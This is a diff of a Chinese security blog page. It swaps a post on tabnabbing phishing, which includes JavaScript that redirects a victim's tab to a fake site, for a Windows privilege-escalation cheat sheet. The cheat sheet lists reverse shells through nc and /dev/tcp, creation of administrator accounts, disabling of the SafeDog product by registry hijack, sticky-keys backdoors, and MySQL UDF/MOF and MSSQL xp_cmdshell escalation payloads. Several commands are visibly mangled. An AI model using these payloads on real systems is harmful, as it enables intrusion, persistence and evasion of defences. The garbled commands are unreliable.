@@ -86,19 +86,17 @@
 
 
 
-<meta name="description" content="由于今天看到一篇文章《危险的 target=”_blank” 与 “opener”》，里面提到了一个老知识点，就是target=”_blank”的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《神奇的opener对象》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。 0x01 效果演示  首先可以看一个小例子">
+<meta name="description" content="端口转发类反弹shell：shell： nc -e cmd ip port shell: bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1(linux)服务器： nc -vv -lp port端口转发：shell: lcx -slave ip port 127.0.0.1 port服务器： lcx -listen port 33891ANTIFW.exe">
 <meta property="og:type" content="article">
-<meta property="og:title" content="「前端钓鱼欺骗」前端黑魔法之远程控制地址栏">
-<meta property="og:url" content="http://MaiKeFee.com/archives/2db90a41.html">
+<meta property="og:title" content="Win 提权技巧">
+<meta property="og:url" content="http://MaiKeFee.com/archives/452f04ea.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="由于今天看到一篇文章《危险的 target=”_blank” 与 “opener”》，里面提到了一个老知识点，就是target=”_blank”的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《神奇的opener对象》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。 0x01 效果演示  首先可以看一个小例子">
+<meta property="og:description" content="端口转发类反弹shell：shell： nc -e cmd ip port shell: bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1(linux)服务器： nc -vv -lp port端口转发：shell: lcx -slave ip port 127.0.0.1 port服务器： lcx -listen port 33891ANTIFW.exe">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://www.cloudtor.com/usr/uploads/2019/07/3956372187.gif">
-<meta property="og:updated_time" content="2019-08-27T15:14:42.263Z">
+<meta property="og:updated_time" content="2019-09-03T08:18:13.103Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="「前端钓鱼欺骗」前端黑魔法之远程控制地址栏">
-<meta name="twitter:description" content="由于今天看到一篇文章《危险的 target=”_blank” 与 “opener”》，里面提到了一个老知识点，就是target=”_blank”的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《神奇的opener对象》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。 0x01 效果演示  首先可以看一个小例子">
-<meta name="twitter:image" content="https://www.cloudtor.com/usr/uploads/2019/07/3956372187.gif">
+<meta name="twitter:title" content="Win 提权技巧">
+<meta name="twitter:description" content="端口转发类反弹shell：shell： nc -e cmd ip port shell: bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1(linux)服务器： nc -vv -lp port端口转发：shell: lcx -slave ip port 127.0.0.1 port服务器： lcx -listen port 33891ANTIFW.exe">
 
 
 
@@ -128,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/archives/2db90a41.html">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/452f04ea.html">
 
 
 
 
 
-  <title>「前端钓鱼欺骗」前端黑魔法之远程控制地址栏 | MaiKeFee|</title>
+  <title>Win 提权技巧 | MaiKeFee|</title>
   
 
 
@@ -314,7 +312,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/2db90a41.html">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/452f04ea.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="MaiKeFee">
@@ -331,7 +329,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">「前端钓鱼欺骗」前端黑魔法之远程控制地址栏</h1>
+          <h1 class="post-title" itemprop="name headline">Win 提权技巧</h1>
         
 
         <div class="post-meta">
@@ -343,8 +341,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-27T23:09:37+08:00">
-                2019-08-27
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-03T16:10:15+08:00">
+                2019-09-03
               </time>
             
 
@@ -359,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-27T23:14:42+08:00">
-                2019-08-27
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-03T16:18:13+08:00">
+                2019-09-03
               </time>
             
           </span>
@@ -374,8 +372,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/archives/2db90a41.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/archives/2db90a41.html" itemprop="commentCount"></span>
+                <a href="/archives/452f04ea.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/archives/452f04ea.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -383,7 +381,7 @@
 
           
           
-             <span id="/archives/2db90a41.html" class="leancloud_visitors" data-flag-title="「前端钓鱼欺骗」前端黑魔法之远程控制地址栏">
+             <span id="/archives/452f04ea.html" class="leancloud_visitors" data-flag-title="Win 提权技巧">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -409,7 +407,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.1k
+                  1.3k
                 </span>
               
 
@@ -425,7 +423,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  4
+                  6
                 </span>
               
             </div>
@@ -446,66 +444,84 @@
       
 
       
-        <p>由于今天看到一篇文章《危险的 target=”_blank” 与 “opener”》，里面提到了一个老知识点，就是target=”_blank”的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《神奇的opener对象》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。</p>
-<p>0x01 效果演示</p>
-<p><img src="https://www.cloudtor.com/usr/uploads/2019/07/3956372187.gif" alt="2018-03-07_23-58-49.gif"></p>
-<p>首先可以看一个小例子：</p>
-<pre><code>http://675ba661.w1n.pw/41593a</code></pre><p>见上图，打开上述链接，然后点击“click me”，打开了百度。这时查看地址栏，的的确确是百度，然后我们等待10秒，再次查看地址栏，这个时候已经变成攻击者的网址了；即使此时我们再访问淘宝等页面，只要仍然在这个标签页下，地址栏就仍然会被控制。</p>
-<p>0x02 原理说明<br>上述页面的代码也很简单：</p>
-<pre><code>&lt;html&gt;
-&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;
-&lt;body&gt;
-&lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot; onclick=&quot;return start()&quot;&gt;click me&lt;/a&gt;
+        <h1 id="端口转发类"><a href="#端口转发类" class="headerlink" title="端口转发类"></a>端口转发类</h1><h3 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h3><pre><code>shell： nc -e cmd ip port
+shell: bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1(linux)</code></pre><h3 id="服务器：-nc-vv-lp-port"><a href="#服务器：-nc-vv-lp-port" class="headerlink" title="服务器： nc -vv -lp port"></a>服务器： nc -vv -lp port</h3><h2 id="端口转发："><a href="#端口转发：" class="headerlink" title="端口转发："></a>端口转发：</h2><pre><code>shell: lcx -slave ip port 127.0.0.1 port</code></pre><h3 id="服务器：-lcx-listen-port-33891"><a href="#服务器：-lcx-listen-port-33891" class="headerlink" title="服务器： lcx -listen port 33891"></a>服务器： lcx -listen port 33891</h3><pre><code>ANTIFW.exe -s #运行程序，将3389转发到80
+ANTIFW.exe -l #关闭程序，恢复iis</code></pre><h1 id="cmd提权类"><a href="#cmd提权类" class="headerlink" title="cmd提权类:"></a>cmd提权类:</h1><h2 id="信息探测类"><a href="#信息探测类" class="headerlink" title="信息探测类"></a>信息探测类</h2><pre><code>systeminfo ：查看系统版本信息
 
-&lt;script&gt;
-function start() {
-    setInterval(function() {
-        baidu.href=&quot;http://675ba661.w1n.pw/baidu&quot;;
-        baidu.click();
-    }, 10000);
-}
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre><p>如果用户点击了超链接“click me”，这里会启动一个循环定时器，每过10秒钟，将会将超链接的地址更换成一个仿百度的钓鱼网站，并再次点击。（当然，如果是真实攻击的话，最好是做一个真实目标的反代服务器，这个在我另一篇文章《openresty+lua在反向代理服务中的玩法》中也有详细的介绍）</p>
-<p>这里，超链接的target属性指定目标URL在哪个页面下打开，就是目标页面的window.name。如果这个a标签的href发生了变化，再次点击链接，页面仍然会在相同的标签页下打开，所以就覆盖了上一次打开的页面。</p>
-<p>比如，我们是一个“网址导航”类型的恶意网站，用户在我们网站上打开了百度、淘宝等标签页面，我们将可以根据用户打开的超链接来生成钓鱼页面，伪造这些网站的登录页面，精准地进行钓鱼。我这里就不进行演示了。</p>
-<p>0x03 扩展尝试<br>除了超链接以外，用window.open也可以达到一样的效果：</p>
-<pre><code>&lt;html&gt;
-&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;
-&lt;body&gt;
-&lt;a href=&quot;javascript:;&quot; onclick=&quot;return start()&quot;&gt;click me&lt;/a&gt;
+netstat -ano : 查看系统开放端口
 
-&lt;script&gt;
-function start() {
-    var w = window.open(&apos;https://www.baidu.com&apos;, &apos;baidu&apos;);
-    setInterval(function() {
-        w.location = &apos;http://675ba661.w1n.pw/baidu&apos;
-    }, 5000)
-}
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre><p>不过，window.open经常会被广告拦截相关的功能给阻止掉，所以可能效果不如直接用超链接。</p>
-<p>那么，继续深入研究。这个现象究竟是否和window.name有关呢？那么是不是我们知道了某个页面的name，即可对其页面的URL进行控制？</p>
-<p>我们可以做一个实验。编写A页面（ <a href="http://a.675ba661.w1n.pw/A_victim" target="_blank" rel="noopener">http://a.675ba661.w1n.pw/A_victim</a> ）：</p>
-<pre><code>&lt;html&gt;
-&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;
-&lt;body&gt;
-&lt;p&gt;Hello world.&lt;/p&gt;
-&lt;script&gt;
-window.name = &apos;baidu&apos;;
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre><p>编写B页面（ <a href="http://b.675ba661.w1n.pw/B_attacker" target="_blank" rel="noopener">http://b.675ba661.w1n.pw/B_attacker</a> ）：</p>
-<pre><code>&lt;html&gt;
-&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;
-&lt;body&gt;
-&lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot;&gt;click me&lt;/a&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre><p>A页面是目标网站，其中设置自己的name是baidu；B是攻击者的页面，其中设置target=”baidu”。</p>
-<p>显然，我们在B中点击“click me”以后，会打开一个新的页面，而不是修改A页面的URL。这个实验说明，URL的远程控制和window.name没有直接关系，而是和页面的父子关系有关。</p>
-<p>0x04 总结<br>本文所描述的攻击方式和opener的攻击方式比较相似，都是在不能跨域的情况下，控制目标标签页的URL，进而进行钓鱼攻击。</p>
-<p>但我觉得这个攻击持久型更佳，因为即使用户在新标签中输入自己的域名，或者又通过超链接点击到其他网站里，这个页面的地址栏永远是受到源页面的控制的。理论上在源页面不关闭的情况下，可以永久控制新页面的地址栏。</p>
+tasklist /svc : 查看系统进程
 
+ipconfig : 查看ip地址
+
+whoami : 查看当前用户
+
+net user : 查看计算机用户列表
+
+net localgroup : 查看计算机用户组列表</code></pre><h2 id="添加用户类"><a href="#添加用户类" class="headerlink" title="添加用户类"></a>添加用户类</h2><pre><code>net user mstlab mstlab /add : 添加用户并设置密码
+
+net localgroup administrators mstlab /add : 将用户加入管理组
+
+net user guest /active:yes : 激活guest用户
+
+net user guest mstlab : 更改guest用户的密码</code></pre><h1 id="KIll-DOG"><a href="#KIll-DOG" class="headerlink" title="KIll DOG:"></a>KIll DOG:</h1><pre><code>Kill Dog：</code></pre><h3 id="1-安全狗默认只拦截加管理组，不拦截加用户"><a href="#1-安全狗默认只拦截加管理组，不拦截加用户" class="headerlink" title="1.安全狗默认只拦截加管理组，不拦截加用户"></a>1.安全狗默认只拦截加管理组，不拦截加用户</h3><p>  法a：利用用户克隆exp：直接克隆administrator的权限<br>  法b：反弹shell读取管理员密码<br>  法c：改注册表替换安全狗的文件，然后重启服务器(redegit /s redegit.reg(redegit.reg见附录))安全狗关闭</p>
+<h3 id="2-安全狗账号防护最严程度：拦截添加用户"><a href="#2-安全狗账号防护最严程度：拦截添加用户" class="headerlink" title="2.安全狗账号防护最严程度：拦截添加用户"></a>2.安全狗账号防护最严程度：拦截添加用户</h3><p>  法a：激活guest，然后克隆用户<br>  法b：反弹shell读取管理员密码<br>  法c：改注册表，重启服务器，关闭安全狗</p>
+<h3 id="redegit-reg脚本内容："><a href="#redegit-reg脚本内容：" class="headerlink" title="redegit.reg脚本内容："></a>redegit.reg脚本内容：</h3><h4 id="Windows-Registry-Editor-Version-5-00"><a href="#Windows-Registry-Editor-Version-5-00" class="headerlink" title="Windows Registry Editor Version 5.00"></a>Windows Registry Editor Version 5.00</h4><pre><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SafeDogGuardCenter.exe]
+&quot;Debugger&quot;=&quot;C:\WWW\l.php&quot;</code></pre><h1 id="开启的3389方法："><a href="#开启的3389方法：" class="headerlink" title="开启的3389方法："></a>开启的3389方法：</h1><h2 id="1-通用开3389-优化后-："><a href="#1-通用开3389-优化后-：" class="headerlink" title="1.通用开3389(优化后)："></a>1.通用开3389(优化后)：</h2><pre><code>wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 1</code></pre><h2 id="2-For-Win2003"><a href="#2-For-Win2003" class="headerlink" title="2.For Win2003:"></a>2.For Win2003:</h2><pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><h2 id="3-For-Win2008"><a href="#3-For-Win2008" class="headerlink" title="3.For Win2008:"></a>3.For Win2008:</h2><pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><h2 id="4-For-Every"><a href="#4-For-Every" class="headerlink" title="4.For Every:"></a>4.For Every:</h2><pre><code>cmd开3389 win08 win03 win7 win2012 winxp</code></pre><h2 id="win08，三条命令即可"><a href="#win08，三条命令即可" class="headerlink" title="win08，三条命令即可:"></a>win08，三条命令即可:</h2><pre><code>wmic /namespace:\root\cimv2    erminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1
+wmic /namespace:\root\cimv2    erminalservices path win32_tsgeneralsetting where (TerminalName =&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1
+reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre><h2 id="win2012通用；win7前两条即可。权限需要run-as-administrator。"><a href="#win2012通用；win7前两条即可。权限需要run-as-administrator。" class="headerlink" title="win2012通用；win7前两条即可。权限需要run as administrator。"></a>win2012通用；win7前两条即可。权限需要run as administrator。</h2><h1 id="查询终端端口-："><a href="#查询终端端口-：" class="headerlink" title="查询终端端口 ："></a>查询终端端口 ：</h1><pre><code>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber
+(or) 终端端口：tasklist /svc查询TermService对应PID和netstat查询的PID对应的端口号
+(or) 注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ Wds dpwd\Tds    cp 中PortNumber的值</code></pre><h1 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权:"></a>数据库提权:</h1><h2 id="UDF手工提权辅助："><a href="#UDF手工提权辅助：" class="headerlink" title="UDF手工提权辅助："></a>UDF手工提权辅助：</h2><pre><code>select @@basedir;  #查看mysql安装目录
+select &apos;It is dll&apos; into dumpfile &apos;C:\。。lib::&apos;;  #利用NTFS ADS创建lib目录
+select &apos;It is dll&apos; into dumpfile &apos;C:\。。lib\plugin::&apos;;  #利用NTFS ADS创建plugin目录
+select 0xUDFcode into dumpfile &apos;C:\phpstu\MySQL\lib\plugin\mstlab.dll&apos;;  #导出udfcode，注意修改udfcode
+create function cmdshell returns string soname &apos;mstlab.dll&apos;;   #用udf创建cmd函数，shell,sys_exec,sys_eval
+select shell(&apos;cmd&apos;,&apos;net user&apos;);     #执行cmd命令</code></pre><p>show variables like ‘%plugin%’;     #查看plugin路径</p>
+<h3 id="小技巧："><a href="#小技巧：" class="headerlink" title="小技巧："></a>小技巧：</h3><pre><code>1.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MySQL 注册表中ImagePath的值为mysql安装目录
+2.my.ini中datadir的值是数据存放目录
+3.UPDATE user set File_priv =&apos;Y&apos;;  flush privileges; 强制加file权限</code></pre><h2 id="MOF手工提权辅助："><a href="#MOF手工提权辅助：" class="headerlink" title="MOF手工提权辅助："></a>MOF手工提权辅助：</h2><p>#pragma namespace(“\.\root\subscription”) </p>
+<pre><code>instance of __EventFilter as  
+{ 
+    EventNamespace = &quot;Root\Cimv2&quot;; 
+    Name  = &quot;filtP2&quot;; 
+    Query = &quot;Select * From __InstanceModificationEvent &quot; 
+            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; 
+            &quot;And TargetInstance.Second = 5&quot;; 
+    QueryLanguage = &quot;WQL&quot;; 
+}; 
+
+instance of ActiveScriptEventConsumer as  
+{ 
+    Name = &quot;consPCSV2&quot;; 
+    ScriptingEngine = &quot;JScript&quot;; 
+    ScriptText = 
+    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;) WSH.run(\&quot;net.exe user admintony admin /add&amp;&amp;net.exe localgroup administrators admintony /add\&quot;)&quot;; 
+}; 
+
+instance of __FilterToConsumerBinding 
+{ 
+    Consumer   = ; 
+    Filter = ; 
+}; 
+
+保存为 1.mof
+然后mysql执行：select load_file(&apos;D:/wwwroot/1.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</code></pre><h2 id="SA提权辅助："><a href="#SA提权辅助：" class="headerlink" title="SA提权辅助："></a>SA提权辅助：</h2><h3 id="1-判断扩展存储是否存在："><a href="#1-判断扩展存储是否存在：" class="headerlink" title="1.判断扩展存储是否存在："></a>1.判断扩展存储是否存在：</h3><pre><code>select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; AND name= &apos;xp_cmdshell&apos;
+select count(*) from master.dbo.sysobjects where name=&apos;xp_regread&apos;</code></pre><h4 id="恢复："><a href="#恢复：" class="headerlink" title="恢复："></a>恢复：</h4><pre><code>exec sp_dropextendedproc &apos;xp_cmdshell&apos;
+exec sp_dropextendedproc xp_cmdshell,&apos;xplog70.dll&apos;
+EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;(SQL2005)</code></pre><h3 id="2-列目录："><a href="#2-列目录：" class="headerlink" title="2.列目录："></a>2.列目录：</h3><pre><code>  exec master..xp_cmdshell &apos;ver&apos;
+  (or) exec master..xp_dirtree &apos;c:\&apos;,1,1
+  (or) drop table black
+       create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))-- 
+       insert into black exec master..xp_cmdshell &apos;dir c:\&apos; 
+       select top 1 mulu from black where id=1
+xp_cmdshell被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权</code></pre><h3 id="3-备份启动项："><a href="#3-备份启动项：" class="headerlink" title="3.备份启动项："></a>3.备份启动项：</h3><pre><code>alter database [master] set RECOVERY FULL
+create table cmd (a image)
+backup log [master] to disk = &apos;c:\cmd1&apos; with init
+insert into cmd (a) values (0x(batcode))
+backup log [master] to disk = &apos;C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\start.bat&apos;
+drop table cmd</code></pre><h3 id="4-映像劫持"><a href="#4-映像劫持" class="headerlink" title="4.映像劫持"></a>4.映像劫持</h3><pre><code>xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&apos;,&apos;debugger&apos;,&apos;reg_sz&apos;,&apos;c:\windows\system32\cmd.exe&apos;</code></pre><h3 id="5-沙盒模式提权："><a href="#5-沙盒模式提权：" class="headerlink" title="5.沙盒模式提权："></a>5.沙盒模式提权：</h3><h4 id="法a："><a href="#法a：" class="headerlink" title="法a："></a>法a：</h4><pre><code>exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Jet.0\Engines&apos;,&apos;SandBoxMode&apos;,&apos;REG_DWORD&apos;,0; #关闭沙盒模式</code></pre><h4 id="法b："><a href="#法b：" class="headerlink" title="法b："></a>法b：</h4><pre><code>Select * From OpenRowSet(&apos;Microsoft.Jet.OLEDB.4.0&apos;,&apos;;Database=c:\windows\system32\ias\ias.mdb&apos;,&apos;select shell(&quot;net user mstlab mstlab /add&quot;)&apos;); #or c:\windows\system32\ias\dnary.mdb string类型用此。
+开启OpenRowSet：exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ad Hoc Distributed Queries&apos;,1;RECONFIGURE;</code></pre><h3 id="6-xp-regwrite操作注册表"><a href="#6-xp-regwrite操作注册表" class="headerlink" title="6.xp_regwrite操作注册表"></a>6.xp_regwrite操作注册表</h3><pre><code>exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows\currentversion un&apos;,&apos;black&apos;,&apos;REG_SZ&apos;,&apos;net user test test /add&apos;
+开启xp_oacreate:exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ole Automation Procedures&apos;,1;RECONFIGURE;</code></pre>
       
     </div>
     
@@ -533,7 +549,7 @@ window.name = &apos;baidu&apos;;
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://MaiKeFee.com/archives/2db90a41.html" title="「前端钓鱼欺骗」前端黑魔法之远程控制地址栏">http://MaiKeFee.com/archives/2db90a41.html</a>
+    <a href="http://MaiKeFee.com/archives/452f04ea.html" title="Win 提权技巧">http://MaiKeFee.com/archives/452f04ea.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -555,8 +571,8 @@ window.name = &apos;baidu&apos;;
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/archives/a5b396d3.html" rel="next" title="Hashpump实现哈希长度扩展攻击">
-                <i class="fa fa-chevron-left"></i> Hashpump实现哈希长度扩展攻击
+              <a href="/archives/f71d256c.html" rel="next" title="Python工具库安全工具总纲">
+                <i class="fa fa-chevron-left"></i> Python工具库安全工具总纲
               </a>
             
           </div>
@@ -564,10 +580,6 @@ window.name = &apos;baidu&apos;;
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/archives/df6dc829.html" rel="prev" title="「应急响应」应急响应实战笔记,一个安全工程师的自我修养">
-                「应急响应」应急响应实战笔记,一个安全工程师的自我修养 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
           
@@ -624,8 +636,17 @@ window.name = &apos;baidu&apos;;
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -727,6 +748,22 @@ window.name = &apos;baidu&apos;;
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#端口转发类"><span class="nav-number">1.</span> <span class="nav-text">端口转发类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell："><span class="nav-number">1.0.1.</span> <span class="nav-text">反弹shell：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务器：-nc-vv-lp-port"><span class="nav-number">1.0.2.</span> <span class="nav-text">服务器： nc -vv -lp port</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口转发："><span class="nav-number">1.1.</span> <span class="nav-text">端口转发：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务器：-lcx-listen-port-33891"><span class="nav-number">1.1.1.</span> <span class="nav-text">服务器： lcx -listen port 33891</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#cmd提权类"><span class="nav-number">2.</span> <span class="nav-text">cmd提权类:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息探测类"><span class="nav-number">2.1.</span> <span class="nav-text">信息探测类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#添加用户类"><span class="nav-number">2.2.</span> <span class="nav-text">添加用户类</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#KIll-DOG"><span class="nav-number">3.</span> <span class="nav-text">KIll DOG:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-安全狗默认只拦截加管理组，不拦截加用户"><span class="nav-number">3.0.1.</span> <span class="nav-text">1.安全狗默认只拦截加管理组，不拦截加用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-安全狗账号防护最严程度：拦截添加用户"><span class="nav-number">3.0.2.</span> <span class="nav-text">2.安全狗账号防护最严程度：拦截添加用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#redegit-reg脚本内容："><span class="nav-number">3.0.3.</span> <span class="nav-text">redegit.reg脚本内容：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-Registry-Editor-Version-5-00"><span class="nav-number">3.0.3.1.</span> <span class="nav-text">Windows Registry Editor Version 5.00</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#开启的3389方法："><span class="nav-number">4.</span> <span class="nav-text">开启的3389方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-通用开3389-优化后-："><span class="nav-number">4.1.</span> <span class="nav-text">1.通用开3389(优化后)：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-For-Win2003"><span class="nav-number">4.2.</span> <span class="nav-text">2.For Win2003:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-For-Win2008"><span class="nav-number">4.3.</span> <span class="nav-text">3.For Win2008:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-For-Every"><span class="nav-number">4.4.</span> <span class="nav-text">4.For Every:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#win08，三条命令即可"><span class="nav-number">4.5.</span> <span class="nav-text">win08，三条命令即可:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#win2012通用；win7前两条即可。权限需要run-as-administrator。"><span class="nav-number">4.6.</span> <span class="nav-text">win2012通用；win7前两条即可。权限需要run as administrator。</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#查询终端端口-："><span class="nav-number">5.</span> <span class="nav-text">查询终端端口 ：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#数据库提权"><span class="nav-number">6.</span> <span class="nav-text">数据库提权:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#UDF手工提权辅助："><span class="nav-number">6.1.</span> <span class="nav-text">UDF手工提权辅助：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小技巧："><span class="nav-number">6.1.1.</span> <span class="nav-text">小技巧：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MOF手工提权辅助："><span class="nav-number">6.2.</span> <span class="nav-text">MOF手工提权辅助：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SA提权辅助："><span class="nav-number">6.3.</span> <span class="nav-text">SA提权辅助：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-判断扩展存储是否存在："><span class="nav-number">6.3.1.</span> <span class="nav-text">1.判断扩展存储是否存在：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#恢复："><span class="nav-number">6.3.1.1.</span> <span class="nav-text">恢复：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-列目录："><span class="nav-number">6.3.2.</span> <span class="nav-text">2.列目录：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-备份启动项："><span class="nav-number">6.3.3.</span> <span class="nav-text">3.备份启动项：</span></a></li><li class="nav-item 